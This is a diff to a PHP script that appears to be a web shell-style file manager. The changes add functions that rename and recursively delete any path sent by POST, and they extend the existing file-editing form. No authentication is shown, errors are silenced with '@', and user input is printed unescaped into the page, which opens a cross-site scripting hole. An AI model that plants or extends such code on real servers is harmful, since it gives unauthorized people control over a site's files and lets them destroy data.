@@ -15,6 +15,7 @@
 		background:none;
 	} textarea.edit {
 		height:300px;
+		resize:none;
 	} th {
 		text-align:center;
 	} .icon {
@@ -49,9 +50,33 @@ function pwd() {
 function edit($filename, $text) {
 	$fp = @fopen($filename, 'w');
 	if (@fwrite($fp, $text)) {
-		print("Success");
+		?>
+		<div class="alert alert-success" role="alert">
+        This File <b><u><?php print $filename ?></u></b> Has Been Edited
+        </div>
+		<?php
 	} else {
-		print("Failed");
+		?>
+		<div class="alert alert-danger" role="alert">
+         This File <b><u><?php print $filename ?></u></b> Failed To Edited
+        </div>
+		<?php
+	}
+}
+function renames($filename, $newname) {
+	if (@rename($filename, $newname)) {
+		?>
+		<div class="alert alert-success" role="alert">
+			This File <b><u><?php print $filename ?></u></b> Has Been Rename to 
+			<b><u><?php print $newname ?></u></b>
+		</div>
+		<?php
+	} else {
+		?>
+		<div class="alert alert-danger" role="alert">
+			This File <b><u><?php print $filename ?></u></b> Failed to Rename
+		</div>
+		<?php
 	}
 }
 ?>
@@ -67,7 +92,59 @@ function edit($filename, $text) {
     		</th>
     	</tr>
 		<tr>
-			<?php
+		<?php
+			function delete($dir) {
+	if (@is_dir($dir)) {
+		$scandir = @scandir($dir);
+		foreach ($scandir as $object) {
+			if ($object != '.' && $object != '..') {
+				if (@is_dir($dir.DIRECTORY_SEPARATOR.$object)) {
+					@delete($dir.DIRECTORY_SEPARATOR.$object);
+				} else {
+					@unlink($dir.DIRECTORY_SEPARATOR.$object);
+				}
+			}
+		} if (@rmdir($dir)) {
+			?>
+			<center>
+		    <div class="alert alert-success" role="alert">
+            This Dir <b><u><?php print $dir ?></u></b> Has Been Deleted
+            </div>
+            </center>
+		    <?php
+		} else {
+			?>
+			<center>
+		    <div class="alert alert-danger" role="alert">
+            This Dir <b><u><?php print $dir ?></u></b> Failed to Deleted
+            </div>
+            </center>
+		    <?php
+		}
+	} else {
+		if (@unlink($dir)) {
+			?>
+			<center>
+		    <div class="alert alert-success" role="alert">
+            This File <b><u><?php print $dir ?></u></b> Has Been Deleted
+            </div>
+            </center>
+		    <?php
+		} else {
+			?>
+			<center>
+		    <div class="alert alert-danger" role="alert">
+            This File <b><u><?php print $dir ?></u></b> Failed to Deleted
+            </div>
+            </center>
+		    <?php
+		}
+	}
+}
+if ($_POST['do'] == 'delete') {
+	@delete($_POST['file']);
+}
+
 			if ($_POST['do'] == 'edit') {
 	          if (isset($_POST['submit'])) {
 		        @edit($_POST['file'], $_POST['text']);
@@ -85,6 +162,23 @@ function edit($filename, $text) {
 	        </form>
 	        <?php
             }
+            if ($_POST['do'] == 'renames') {
+            	if (isset($_POST['submit'])) {
+            		@renames($_POST['file'], $_POST['newname']);
+            	}
+            	?>
+            	<form method="post">
+            		<td>
+            			<input style="width:100%;" type="text" name="newname" value="<?php print $_POST['file'] ?>">
+            		</td>
+            		<input type="hidden" name="do" value="renames">
+	        	    <input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
+            		<td>
+            			<input style="width:100%;" type="submit" name="submit">
+            		</td>
+            	</form>
+            	<?php
+            }
 			?>
 		</tr>
     	<tr>
@@ -101,7 +195,18 @@ function edit($filename, $text) {
     				<img src="http://icons.iconarchive.com/icons/custom-icon-design/flatastic-1/256/folder-icon.png" class="icon"> 
     				 <a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
     			</td>
-    			<td></td>
+    			<td>
+    				<center>
+    				<form method="post" action="?dir=<?php print @cwd() ?>">
+    					<select name="do">
+    						<option value="renames">Rename</option>
+    						<option value="delete">Delete</option>
+    					</select>
+    					<input type="hidden" name="file" value="<?php print $dir ?>">
+    					<input type="submit" name="">
+    				</form>
+    			</center>
+    			</td>
     		</tr> 
     		<?php
     	}
@@ -110,15 +215,17 @@ function edit($filename, $text) {
     		?>
     		<tr>
     			<td>
-    				<img src="https://cdn.icon-icons.com/icons2/205/PNG/512/text_plain_24600.png" class="icon"> 
+    				<img class="icon" src="https://pngimage.net/wp-content/uploads/2018/06/file-png-12.png">
     				 <?php print $file ?>
     			</td>
     			<td><center>
     				<form method="post" action="?dir=<?php print @cwd() ?>">
     					<select name="do">
     						<option value="edit">Edit</option>
+    						<option value="renames">Rename</option>
+    						<option value="delete">Delete</option>
     					</select>
-    					<input type="hidden" name="file" value="<?php print @cwd().SEP.$file ?>">
+    					<input type="hidden" name="file" value="<?php print $file ?>">
     					<input type="submit">
     				</form>
     			</td>
